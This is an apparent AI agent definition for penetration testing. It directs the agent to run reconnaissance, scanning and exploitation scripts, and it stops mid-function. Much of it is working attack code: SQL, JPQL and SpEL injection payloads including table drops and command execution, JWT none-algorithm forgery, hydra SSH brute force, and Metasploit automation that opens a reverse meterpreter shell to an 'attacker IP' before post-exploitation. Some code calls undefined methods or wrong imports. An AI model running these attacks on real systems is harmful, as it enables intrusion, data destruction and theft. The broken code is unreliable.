# Penetration Testing and Security Audit

**Agent: security-engineer**
**Purpose: Conduct comprehensive penetration testing and security audits with technology-adaptive testing methodologies**

---

## Context Analysis

The security-engineer will analyze the CLAUDE.md file to determine:
- **Technology Stack**: Target technologies (Java/Spring, .NET Core, Node.js, Python/FastAPI) for appropriate vulnerability testing techniques and exploit selection
- **Application Architecture**: Web applications, APIs, desktop applications, or mobile apps for targeted testing methodologies
- **Business Domain**: Industry-specific threats and compliance requirements (fintech, healthcare, ecommerce) for tailored attack scenarios
- **Project Scale**: Infrastructure complexity and attack surface size for comprehensive testing scope and resource allocation
- **Security Maturity**: Current security implementation level for appropriate testing depth and exploitation boundaries

Based on this analysis, the security engineer will select appropriate penetration testing tools, customize attack scenarios, and focus on technology-specific vulnerabilities and misconfigurations.

## 🎯 Mission

Execute systematic penetration testing and security audits to identify vulnerabilities, validate security controls, and ensure robust defense against real-world attacks.

## 📋 Penetration Testing Process

### Step 1: Pre-Engagement and Planning

**Scope Definition and Authorization:**
```yaml
penetration_test_scope:
  test_type: "black_box | gray_box | white_box"
  target_systems:
    - web_applications: ["https://app.example.com", "https://api.example.com"]
    - network_infrastructure: ["10.0.0.0/24", "192.168.1.0/24"]
    - mobile_applications: ["iOS App v2.1", "Android App v2.1"]
    - cloud_infrastructure: ["AWS Production Account", "Azure Dev Environment"]
    
  testing_methodology: "OWASP WSTG | NIST SP 800-115 | PTES"
  
  rules_of_engagement:
    - authorized_users: ["security-engineer@company.com"]
    - testing_window: "2024-01-15T09:00:00 to 2024-01-19T17:00:00"
    - prohibited_actions: ["data_modification", "service_disruption", "social_engineering"]
    - emergency_contacts: ["security-team@company.com", "+1-555-SEC-TEAM"]
    
  compliance_requirements:
    - frameworks: ["SOC2", "PCI-DSS", "GDPR", "HIPAA"]
    - audit_standards: ["ISO 27001", "NIST Cybersecurity Framework"]
```

**Test Environment Preparation:**
```bash
# Kali Linux penetration testing toolkit setup
sudo apt update && sudo apt upgrade -y

# Essential penetration testing tools
sudo apt install -y \
  nmap ncat netdiscover \
  gobuster dirb dirbuster \
  sqlmap burpsuite \
  metasploit-framework \
  nikto wpscan \
  hydra john hashcat \
  wireshark tcpdump \
  aircrack-ng reaver \
  social-engineer-toolkit

# Web application testing tools
pip3 install \
  requests beautifulsoup4 \
  selenium webdriver-manager \
  scrapy paramiko \
  impacket ldap3

# Custom security testing scripts
git clone https://github.com/SecLists/SecLists.git
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
```

### Step 2: Reconnaissance and Information Gathering

**Passive Information Gathering:**
```python
# automated_reconnaissance.py
import requests, subprocess, json
from urllib.parse import urlparse
import dns.resolver, whois

class ReconnaissanceEngine:
    def __init__(self, target_domain):
        self.target = target_domain
        self.results = {}
    
    def passive_reconnaissance(self):
        """Collect information without directly interacting with target"""
        
        # WHOIS information
        self.results['whois'] = self.get_whois_info()
        
        # DNS enumeration
        self.results['dns'] = self.enumerate_dns()
        
        # Certificate transparency logs
        self.results['certificates'] = self.check_certificate_transparency()
        
        # Social media and public information
        self.results['osint'] = self.gather_osint()
        
        # Technology stack identification
        self.results['technology_stack'] = self.identify_technologies()
        
        return self.results
    
    def enumerate_dns(self):
        """Comprehensive DNS enumeration"""
        dns_results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                dns_results[record_type] = [str(answer) for answer in answers]
            except Exception as e:
                dns_results[record_type] = f"Error: {str(e)}"
        
        # Subdomain enumeration
        dns_results['subdomains'] = self.enumerate_subdomains()
        
        return dns_results
    
    def enumerate_subdomains(self):
        """Find subdomains using multiple techniques"""
        subdomains = set()
        
        # Certificate transparency
        ct_subdomains = self.check_certificate_transparency()
        subdomains.update(ct_subdomains)
        
        # DNS brute force with common subdomain list
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'app',
            'dev', 'staging', 'test', 'prod', 'beta',
            'vpn', 'ssh', 'portal', 'dashboard', 'cdn'
        ]
        
        for subdomain in common_subdomains:
            try:
                full_domain = f"{subdomain}.{self.target}"
                answers = dns.resolver.resolve(full_domain, 'A')
                subdomains.add(full_domain)
            except:
                pass
        
        return list(subdomains)
    
    def check_certificate_transparency(self):
        """Query certificate transparency logs"""
        try:
            url = f"https://crt.sh/?q=%.{self.target}&output=json"
            response = requests.get(url, timeout=10)
            certificates = response.json()
            
            subdomains = set()
            for cert in certificates:
                name_value = cert.get('name_value', '')
                subdomains.update(name_value.split('\n'))
            
            return list(subdomains)
        except Exception as e:
            return [f"Error: {str(e)}"]
```

**Active Network Scanning:**
```python
# network_scanner.py
import nmap, socket
from concurrent.futures import ThreadPoolExecutor

class NetworkScanner:
    def __init__(self, target_range):
        self.target_range = target_range
        self.nm = nmap.PortScanner()
    
    def comprehensive_scan(self):
        """Execute comprehensive network scanning"""
        results = {}
        
        # Host discovery
        results['live_hosts'] = self.discover_hosts()
        
        # Port scanning
        results['open_ports'] = self.scan_ports()
        
        # Service identification
        results['services'] = self.identify_services()
        
        # OS fingerprinting
        results['os_detection'] = self.detect_operating_systems()
        
        # Vulnerability scanning
        results['vulnerabilities'] = self.scan_vulnerabilities()
        
        return results
    
    def discover_hosts(self):
        """Discover live hosts in target range"""
        try:
            self.nm.scan(hosts=self.target_range, arguments='-sn -PE -PP -PM')
            live_hosts = []
            
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    live_hosts.append({
                        'ip': host,
                        'hostname': self.nm[host].hostname(),
                        'state': self.nm[host].state()
                    })
            
            return live_hosts
        except Exception as e:
            return [f"Error: {str(e)}"]
    
    def scan_ports(self):
        """Comprehensive port scanning"""
        port_results = {}
        
        # Common ports scan (fast)
        common_ports = "21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080"
        
        try:
            self.nm.scan(self.target_range, common_ports, arguments='-sS -sV')
            
            for host in self.nm.all_hosts():
                host_ports = []
                for protocol in self.nm[host].all_protocols():
                    ports = self.nm[host][protocol].keys()
                    for port in ports:
                        port_info = {
                            'port': port,
                            'protocol': protocol,
                            'state': self.nm[host][protocol][port]['state'],
                            'service': self.nm[host][protocol][port]['name'],
                            'version': self.nm[host][protocol][port]['version']
                        }
                        host_ports.append(port_info)
                
                port_results[host] = host_ports
            
            return port_results
        except Exception as e:
            return {f"Error": str(e)}
    
    def scan_vulnerabilities(self):
        """Run Nmap vulnerability scripts"""
        try:
            vuln_scripts = "--script=vuln,safe,discovery"
            self.nm.scan(self.target_range, arguments=vuln_scripts)
            
            vulnerability_results = {}
            for host in self.nm.all_hosts():
                if 'script' in self.nm[host]:
                    vulnerability_results[host] = self.nm[host]['script']
            
            return vulnerability_results
        except Exception as e:
            return {f"Error": str(e)}
```

### Step 3: Web Application Penetration Testing

**Automated Web Application Testing:**
```python
# web_app_pentest.py
import requests, time, re
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By

class WebAppPentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def comprehensive_webapp_test(self):
        """Execute comprehensive web application penetration test"""
        
        # Information gathering
        self.gather_webapp_info()
        
        # Authentication testing
        self.test_authentication()
        
        # Session management testing
        self.test_session_management()
        
        # Input validation testing
        self.test_input_validation()
        
        # Access control testing
        self.test_access_controls()
        
        # Business logic testing
        self.test_business_logic()
        
        return self.vulnerabilities
    
    def test_sql_injection(self, url, parameters):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
        ]
        
        for param in parameters:
            for payload in sql_payloads:
                test_params = parameters.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        "SQL syntax error", "mysql_fetch_array()",
                        "ORA-00936", "Microsoft OLE DB Provider",
                        "PostgreSQL query failed", "SQLite error"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': error
                            })
                            break
                
                except Exception as e:
                    continue
    
    def test_xss(self, url, parameters):
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>"
        ]
        
        for param in parameters:
            for payload in xss_payloads:
                test_params = parameters.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        # Verify it's not properly encoded
                        if not self.is_properly_encoded(payload, response.text):
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Payload reflected without proper encoding'
                            })
                
                except Exception as e:
                    continue
    
    def test_authentication_bypass(self, login_url):
        """Test authentication bypass techniques"""
        bypass_payloads = [
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': 'admin', 'password': "' OR '1'='1' --"},
            {'username': "' OR '1'='1' --", 'password': 'anything'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'}
        ]
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=10)
                
                # Check for successful authentication indicators
                success_indicators = [
                    'dashboard', 'welcome', 'logout', 'profile',
                    'admin panel', 'control panel'
                ]
                
                for indicator in success_indicators:
                    if indicator.lower() in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Authentication Bypass',
                            'severity': 'Critical',
                            'url': login_url,
                            'method': 'POST',
                            'payload': payload,
                            'evidence': f"Successfully authenticated with: {payload}"
                        })
                        break
            
            except Exception as e:
                continue
```

### Step 4: Infrastructure Penetration Testing

**Network Service Testing:**
```bash
#!/bin/bash
# infrastructure_pentest.sh

TARGET_IP="$1"
OUTPUT_DIR="pentest_results"
mkdir -p "$OUTPUT_DIR"

echo "[+] Starting Infrastructure Penetration Test for $TARGET_IP"

# Nmap comprehensive scan
echo "[+] Running comprehensive Nmap scan..."
nmap -sS -sV -sC -O -A -T4 -p- \
  --script=vuln,safe,discovery \
  --script-args=unsafe=1 \
  -oA "$OUTPUT_DIR/nmap_comprehensive" \
  "$TARGET_IP"

# Service-specific testing
echo "[+] Testing common services..."

# SSH Testing
if nmap -p 22 --open "$TARGET_IP" | grep -q "22/tcp open"; then
    echo "[+] Testing SSH service..."
    
    # SSH version detection
    ssh -V 2>&1 | tee "$OUTPUT_DIR/ssh_version.txt"
    
    # Common credential testing
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
          -P /usr/share/wordlists/metasploit/unix_passwords.txt \
          -t 4 -f "$TARGET_IP" ssh 2>/dev/null | \
          tee "$OUTPUT_DIR/ssh_bruteforce.txt"
fi

# HTTP/HTTPS Testing
if nmap -p 80,443 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing web services..."
    
    # Directory enumeration
    gobuster dir -u "http://$TARGET_IP" \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
      -x php,html,txt,xml,js \
      -o "$OUTPUT_DIR/gobuster_http.txt"
    
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        gobuster dir -u "https://$TARGET_IP" \
          -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
          -x php,html,txt,xml,js \
          -k -o "$OUTPUT_DIR/gobuster_https.txt"
    fi
    
    # SSL/TLS testing
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        sslscan "$TARGET_IP":443 | tee "$OUTPUT_DIR/sslscan.txt"
        testssl.sh "$TARGET_IP":443 | tee "$OUTPUT_DIR/testssl.txt"
    fi
    
    # Web application vulnerability scanning
    nikto -h "http://$TARGET_IP" -o "$OUTPUT_DIR/nikto_http.txt"
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        nikto -h "https://$TARGET_IP" -o "$OUTPUT_DIR/nikto_https.txt"
    fi
fi

# Database testing
if nmap -p 3306,5432,1433,1521 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing database services..."
    
    # MySQL testing (port 3306)
    if nmap -p 3306 --open "$TARGET_IP" | grep -q "3306/tcp open"; then
        echo "[+] Testing MySQL..."
        nmap --script=mysql-* -p 3306 "$TARGET_IP" | \
          tee "$OUTPUT_DIR/mysql_scripts.txt"
    fi
    
    # PostgreSQL testing (port 5432)
    if nmap -p 5432 --open "$TARGET_IP" | grep -q "5432/tcp open"; then
        echo "[+] Testing PostgreSQL..."
        nmap --script=pgsql-* -p 5432 "$TARGET_IP" | \
          tee "$OUTPUT_DIR/postgresql_scripts.txt"
    fi
fi

# SMB/NetBIOS testing
if nmap -p 139,445 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing SMB/NetBIOS services..."
    
    enum4linux -a "$TARGET_IP" | tee "$OUTPUT_DIR/enum4linux.txt"
    smbclient -L "//$TARGET_IP" -N | tee "$OUTPUT_DIR/smbclient.txt"
    nmap --script=smb-vuln-* -p 139,445 "$TARGET_IP" | \
      tee "$OUTPUT_DIR/smb_vulns.txt"
fi

echo "[+] Infrastructure penetration test completed. Results in $OUTPUT_DIR/"
```

### Step 5: Vulnerability Analysis and Exploitation

**Automated Exploitation Framework:**
```python
# exploitation_engine.py
import subprocess, json, time
from metasploit.msfrpc import MsfRpcClient

class ExploitationEngine:
    def __init__(self):
        self.client = MsfRpcClient('password', server='127.0.0.1', port=55552)
        self.exploitable_vulns = []
    
    def analyze_vulnerabilities(self, nmap_results):
        """Analyze scan results for exploitable vulnerabilities"""
        
        # Parse Nmap results
        vulns = self.parse_nmap_vulns(nmap_results)
        
        # Map to Metasploit exploits
        for vuln in vulns:
            exploit_modules = self.find_exploit_modules(vuln)
            if exploit_modules:
                self.exploitable_vulns.append({
                    'vulnerability': vuln,
                    'exploits': exploit_modules,
                    'target': vuln.get('host'),
                    'port': vuln.get('port')
                })
    
    def attempt_exploitation(self, vulnerability):
        """Attempt to exploit identified vulnerability"""
        
        for exploit_info in vulnerability['exploits']:
            try:
                exploit = self.client.modules.use('exploit', exploit_info['module'])
                
                # Set required options
                exploit['RHOSTS'] = vulnerability['target']
                exploit['RPORT'] = vulnerability['port']
                
                # Set payload
                if 'payload' in exploit_info:
                    exploit.payloads = exploit_info['payload']
                else:
                    # Use generic reverse shell
                    exploit.payloads = 'linux/x86/meterpreter/reverse_tcp'
                    exploit['LHOST'] = '192.168.1.100'  # Attacker IP
                    exploit['LPORT'] = '4444'
                
                # Execute exploit
                result = exploit.execute()
                
                if result['job_id']:
                    # Wait for session
                    time.sleep(10)
                    sessions = self.client.sessions.list
                    
                    if sessions:
                        return {
                            'status': 'success',
                            'exploit': exploit_info['module'],
                            'session_id': list(sessions.keys())[0],
                            'target': vulnerability['target']
                        }
            
            except Exception as e:
                continue
        
        return {'status': 'failed', 'target': vulnerability['target']}
    
    def post_exploitation(self, session_id):
        """Perform post-exploitation activities"""
        
        session = self.client.sessions.session(session_id)
        post_exploit_results = {}
        
        # System information
        post_exploit_results['system_info'] = session.run_with_output('sysinfo')
        
        # User information
        post_exploit_results['user_info'] = session.run_with_output('getuid')
        
        # Network information
        post_exploit_results['network_info'] = session.run_with_output('ipconfig')
        
        # Process list
        post_exploit_results['processes'] = session.run_with_output('ps')
        
        # Privilege escalation attempts
        post_exploit_results['privesc'] = self.attempt_privilege_escalation(session)
        
        # Lateral movement opportunities
        post_exploit_results['lateral_movement'] = self.identify_lateral_movement(session)
        
        return post_exploit_results
```

### Step 6: Reporting and Documentation

**Comprehensive Penetration Test Report:**
```python
# pentest_report_generator.py
from datetime import datetime
import json, markdown

class PentestReportGenerator:
    def __init__(self):
        self.report_data = {}
        
    def generate_comprehensive_report(self, test_results):
        """Generate comprehensive penetration test report"""
        
        report = {
            'executive_summary': self.generate_executive_summary(test_results),
            'methodology': self.document_methodology(),
            'scope_and_limitations': self.document_scope(),
            'findings_summary': self.summarize_findings(test_results),
            'detailed_findings': self.document_detailed_findings(test_results),
            'risk_assessment': self.assess_risks(test_results),
            'recommendations': self.generate_recommendations(test_results),
            'appendices': self.generate_appendices(test_results)
        }
        
        return self.format_report(report)
    
    def generate_executive_summary(self, results):
        """Generate executive summary for stakeholders"""
        
        total_vulns = len(results.get('vulnerabilities', []))
        critical_vulns = len([v for v in results.get('vulnerabilities', []) 
                            if v.get('severity') == 'Critical'])
        high_vulns = len([v for v in results.get('vulnerabilities', []) 
                        if v.get('severity') == 'High'])
        
        risk_level = 'Low'
        if critical_vulns > 0:
            risk_level = 'Critical'
        elif high_vulns > 3:
            risk_level = 'High'
        elif high_vulns > 0:
            risk_level = 'Medium'
        
        return {
            'overall_risk_rating': risk_level,
            'total_vulnerabilities': total_vulns,
            'critical_vulnerabilities': critical_vulns,
            'high_vulnerabilities': high_vulns,
            'key_findings': self.extract_key_findings(results),
            'business_impact': self.assess_business_impact(results),
            'immediate_actions': self.recommend_immediate_actions(results)
        }
    
    def document_detailed_findings(self, results):
        """Document detailed vulnerability findings"""
        
        detailed_findings = []
        
        for vuln in results.get('vulnerabilities', []):
            finding = {
                'title': vuln.get('type', 'Unknown Vulnerability'),
                'severity': vuln.get('severity', 'Medium'),
                'cvss_score': vuln.get('cvss_score', 'N/A'),
                'affected_systems': [vuln.get('url') or vuln.get('host')],
                'description': self.generate_vuln_description(vuln),
                'technical_details': {
                    'vulnerability_type': vuln.get('type'),
                    'location': vuln.get('url') or vuln.get('host'),
                    'parameter': vuln.get('parameter'),
                    'payload_used': vuln.get('payload'),
                    'evidence': vuln.get('evidence')
                },
                'impact_assessment': self.assess_vuln_impact(vuln),
                'exploitation_likelihood': self.assess_exploitation_likelihood(vuln),
                'remediation_steps': self.generate_remediation_steps(vuln),
                'references': self.get_vuln_references(vuln)
            }
            detailed_findings.append(finding)
        
        return sorted(detailed_findings, 
                     key=lambda x: self.severity_priority(x['severity']))
    
    def generate_recommendations(self, results):
        """Generate comprehensive security recommendations"""
        
        recommendations = {
            'immediate_actions': [
                'Patch all critical vulnerabilities within 24 hours',
                'Implement temporary mitigations for high-severity issues',
                'Monitor systems for signs of active exploitation',
                'Review and update incident response procedures'
            ],
            'short_term_actions': [
                'Implement comprehensive vulnerability management program',
                'Enhance security monitoring and logging',
                'Conduct security awareness training',
                'Implement multi-factor authentication'
            ],
            'long_term_actions': [
                'Implement security development lifecycle (SDL)',
                'Regular penetration testing program',
                'Security architecture review and hardening',
                'Establish security metrics and KPIs'
            ],
            'technical_recommendations': self.generate_technical_recommendations(results),
            'process_recommendations': self.generate_process_recommendations(results)
        }
        
        return recommendations
```

## Technology-Adaptive Implementation

### Java/Spring Boot Application Testing

**Recommended Pattern:** Spring Security-focused testing with JPA injection and JWT token manipulation

```python
# spring_boot_pentest.py
import requests
import jwt
import json
from datetime import datetime, timedelta

class SpringBootPentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_spring_vulnerabilities(self):
        """Test Spring Boot specific vulnerabilities"""
        
        # Spring Boot Actuator exposure
        self.test_actuator_endpoints()
        
        # Spring Security misconfigurations
        self.test_spring_security_bypasses()
        
        # JPA/Hibernate injection
        self.test_jpa_injection()
        
        # JWT token vulnerabilities
        self.test_jwt_vulnerabilities()
        
        # Spring Expression Language injection
        self.test_spel_injection()
        
        return self.vulnerabilities
    
    def test_actuator_endpoints(self):
        """Test for exposed Spring Boot Actuator endpoints"""
        actuator_endpoints = [
            '/actuator', '/actuator/health', '/actuator/info',
            '/actuator/metrics', '/actuator/env', '/actuator/configprops',
            '/actuator/mappings', '/actuator/beans', '/actuator/trace',
            '/actuator/dump', '/actuator/shutdown', '/actuator/flyway',
            '/actuator/liquidbase', '/management', '/manage'
        ]
        
        for endpoint in actuator_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
                if response.status_code == 200:
                    # Check for sensitive information exposure
                    sensitive_keywords = [
                        'password', 'secret', 'key', 'token', 'credential',
                        'database.url', 'spring.datasource', 'jwt.secret'
                    ]
                    
                    for keyword in sensitive_keywords:
                        if keyword.lower() in response.text.lower():
                            self.vulnerabilities.append({
                                'type': 'Spring Boot Actuator Information Disclosure',
                                'severity': 'High',
                                'endpoint': endpoint,
                                'evidence': f"Sensitive information '{keyword}' exposed",
                                'impact': 'Configuration and secrets exposure'
                            })
                            break
                    
                    # Check for dangerous endpoints
                    if endpoint.endswith('/shutdown') and 'POST' in response.headers.get('Allow', ''):
                        self.vulnerabilities.append({
                            'type': 'Spring Boot Actuator Remote Shutdown',
                            'severity': 'Critical',
                            'endpoint': endpoint,
                            'evidence': 'Shutdown endpoint is accessible',
                            'impact': 'Remote application shutdown possible'
                        })
            except Exception as e:
                continue
    
    def test_jpa_injection(self):
        """Test for JPA/JPQL injection vulnerabilities"""
        jpa_payloads = [
            "' OR 1=1--",
            "'; SELECT u FROM User u WHERE u.role='ADMIN'--",
            "' UNION SELECT password FROM User WHERE username='admin'--",
            "'; UPDATE User SET role='ADMIN' WHERE username='victim'--"
        ]
        
        # Find endpoints that likely use JPA queries
        search_endpoints = ['/search', '/find', '/query', '/list', '/filter']
        
        for endpoint in search_endpoints:
            for payload in jpa_payloads:
                test_params = {'query': payload, 'search': payload, 'filter': payload}
                
                try:
                    response = self.session.get(f"{self.target}{endpoint}", 
                                              params=test_params, timeout=10)
                    
                    # Check for JPQL error messages
                    jpql_errors = [
                        'org.hibernate.hql.ast.QuerySyntaxException',
                        'javax.persistence.Query',
                        'org.hibernate.exception.SQLGrammarException',
                        'JPA Query Exception'
                    ]
                    
                    for error in jpql_errors:
                        if error in response.text:
                            self.vulnerabilities.append({
                                'type': 'JPA/JPQL Injection',
                                'severity': 'Critical',
                                'endpoint': endpoint,
                                'payload': payload,
                                'evidence': f"JPQL error: {error}",
                                'impact': 'Database access and data manipulation'
                            })
                            break
                            
                except Exception as e:
                    continue
    
    def test_jwt_vulnerabilities(self):
        """Test JWT implementation vulnerabilities"""
        # Try to get a JWT token first
        login_endpoints = ['/api/auth/login', '/login', '/authenticate']
        token = None
        
        for endpoint in login_endpoints:
            try:
                # Common default credentials
                creds = {'username': 'admin', 'password': 'admin'}
                response = self.session.post(f"{self.target}{endpoint}", json=creds)
                
                if 'token' in response.text.lower():
                    token_data = response.json()
                    token = token_data.get('token') or token_data.get('accessToken')
                    break
            except:
                continue
        
        if token:
            # Test JWT vulnerabilities
            self.test_jwt_none_algorithm(token)
            self.test_jwt_weak_secret(token)
            self.test_jwt_key_confusion(token)
    
    def test_jwt_none_algorithm(self, original_token):
        """Test for JWT 'none' algorithm bypass"""
        try:
            # Decode without verification to get payload
            decoded = jwt.decode(original_token, options={"verify_signature": False})
            
            # Create new token with 'none' algorithm
            malicious_payload = decoded.copy()
            malicious_payload['role'] = 'ADMIN'
            malicious_payload['exp'] = int((datetime.utcnow() + timedelta(hours=1)).timestamp())
            
            # Create token with 'none' algorithm
            malicious_token = jwt.encode(malicious_payload, '', algorithm='none')
            
            # Test with protected endpoint
            headers = {'Authorization': f'Bearer {malicious_token}'}
            response = self.session.get(f"{self.target}/api/admin/users", headers=headers)
            
            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'JWT None Algorithm Bypass',
                    'severity': 'Critical',
                    'evidence': 'Successfully bypassed JWT validation with none algorithm',
                    'impact': 'Complete authentication bypass and privilege escalation'
                })
                
        except Exception as e:
            pass
    
    def test_spel_injection(self):
        """Test for Spring Expression Language injection"""
        spel_payloads = [
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.System).getProperty('user.dir')}"
        ]
        
        # Test common parameter names that might be processed by SpEL
        param_names = ['expression', 'formula', 'template', 'message', 'text']
        
        for param in param_names:
            for payload in spel_payloads:
                try:
                    test_data = {param: payload}
                    response = self.session.post(f"{self.target}/api/process", 
                                               json=test_data, timeout=10)
                    
                    # Check if SpEL was evaluated
                    if payload == "${7*7}" or payload == "#{7*7}":
                        if "49" in response.text:
                            self.vulnerabilities.append({
                                'type': 'Spring Expression Language Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Mathematical expression evaluated: 7*7=49',
                                'impact': 'Remote code execution possible'
                            })
                    
                    # Check for command execution
                    elif 'whoami' in payload.lower() or 'id' in payload:
                        if any(indicator in response.text.lower() 
                              for indicator in ['root', 'uid=', 'gid=', 'administrator']):
                            self.vulnerabilities.append({
                                'type': 'Spring Expression Language RCE',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Command execution successful',
                                'impact': 'Remote code execution achieved'
                            })
                            
                except Exception as e:
                    continue

# Database-specific testing for Spring Boot
def test_spring_data_jpa_vulnerabilities(target_url):
    """Test Spring Data JPA specific vulnerabilities"""
    
    # Test for repository exposure via Spring Data REST
    data_rest_endpoints = [
        '/api/users', '/api/customers', '/api/orders',
        '/api/products', '/api/accounts', '/users',
        '/customers', '/orders', '/products'
    ]
    
    vulnerabilities = []
    session = requests.Session()
    
    for endpoint in data_rest_endpoints:
        try:
            # Test for unauthenticated access
            response = session.get(f"{target_url}{endpoint}")
            
            if response.status_code == 200 and 'application/hal+json' in response.headers.get('content-type', ''):
                data = response.json()
                
                # Check if sensitive data is exposed
                if '_embedded' in data:
                    vulnerabilities.append({
                        'type': 'Spring Data REST Exposure',
                        'severity': 'High',
                        'endpoint': endpoint,
                        'evidence': 'Repository data exposed via REST without authentication',
                        'impact': 'Unauthorized data access'
                    })
                
                # Test for write operations
                test_data = {'name': 'test', 'value': 'pentest'}
                post_response = session.post(f"{target_url}{endpoint}", json=test_data)
                
                if post_response.status_code in [200, 201]:
                    vulnerabilities.append({
                        'type': 'Spring Data REST Unauthorized Write',
                        'severity': 'Critical',
                        'endpoint': endpoint,
                        'evidence': 'Successfully created data without authentication',
                        'impact': 'Unauthorized data manipulation'
                    })
                    
        except Exception as e:
            continue
    
    return vulnerabilities
```

### .NET Core Application Testing

**Recommended Pattern:** ASP.NET Core security testing with Entity Framework and Identity vulnerabilities

```python
# dotnet_core_pentest.py
import requests
import base64
import json
from urllib.parse import quote

class DotNetCorePentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_dotnet_vulnerabilities(self):
        """Test .NET Core specific vulnerabilities"""
        
        # ASP.NET Core configuration exposure
        self.test_configuration_exposure()
        
        # Entity Framework injection
        self.test_entity_framework_injection()
        
        # ASP.NET Core Identity vulnerabilities
        self.test_identity_vulnerabilities()
        
        # Model binding vulnerabilities
        self.test_model_binding_attacks()
        
        # ViewState manipulation
        self.test_viewstate_attacks()
        
        return self.vulnerabilities
    
    def test_configuration_exposure(self):
        """Test for exposed configuration endpoints"""
        config_endpoints = [
            '/api/configuration', '/config', '/appsettings',
            '/.well-known/configuration', '/health', '/info',
            '/metrics', '/env'
        ]
        
        for endpoint in config_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
                
                if response.status_code == 200:
                    # Check for sensitive configuration data
                    sensitive_keys = [
                        'connectionstring', 'password', 'secret', 'key',
                        'jwt:secret', 'database', 'apikey', 'token'
                    ]
                    
                    response_lower = response.text.lower()
                    for key in sensitive_keys:
                        if key in response_lower:
                            self.vulnerabilities.append({
                                'type': '.NET Configuration Exposure',
                                'severity': 'High',
                                'endpoint': endpoint,
                                'evidence': f"Sensitive configuration '{key}' exposed",
                                'impact': 'Credentials and secrets disclosure'
                            })
                            break
                            
            except Exception as e:
                continue
    
    def test_entity_framework_injection(self):
        """Test for Entity Framework LINQ injection"""
        ef_payloads = [
            "'; DROP TABLE Users--",
            "' OR 1=1--",
            "\'; SELECT * FROM Users WHERE Role=\'Admin\'--",
            "' UNION SELECT Password FROM Users WHERE Username='admin'--"
        ]
        
        # Common EF endpoint patterns
        ef_endpoints = ['/api/search', '/api/filter', '/api/query', '/api/find']
        
        for endpoint in ef_endpoints:
            for payload in ef_payloads:
                test_params = {
                    'query': payload,
                    'search': payload,
                    'filter': payload,
                    'where': payload
                }
                
                try:
                    response = self.session.get(f"{self.target}{endpoint}", 
                                              params=test_params, timeout=10)
                    
                    # Check for Entity Framework error messages
                    ef_errors = [
                        'System.Data.SqlClient.SqlException',
                        'Microsoft.EntityFrameworkCore',
                        'EntityFramework.Core.DbUpdateException',
                        'System.InvalidOperationException: The LINQ expression'
                    ]
                    
                    for error in ef_errors:
                        if error in response.text:
                            self.vulnerabilities.append({
                                'type': 'Entity Framework Injection',
                                'severity': 'Critical',
                                'endpoint': endpoint,
                                'payload': payload,
                                'evidence': f"EF error: {error}",
                                'impact': 'Database access and manipulation'
                            })
                            break
                            
                except Exception as e:
                    continue
    
    def test_model_binding_attacks(self):
        """Test for model binding vulnerabilities"""
        # Test mass assignment
        mass_assignment_payloads = [
            {'IsAdmin': True, 'Role': 'Administrator'},
            {'Password': 'hacked', 'IsActive': True},
            {'Permissions': ['Admin', 'SuperUser']},
            {'UserId': 1, 'Username': 'admin'}
        ]
        
        # Common endpoints that accept model binding
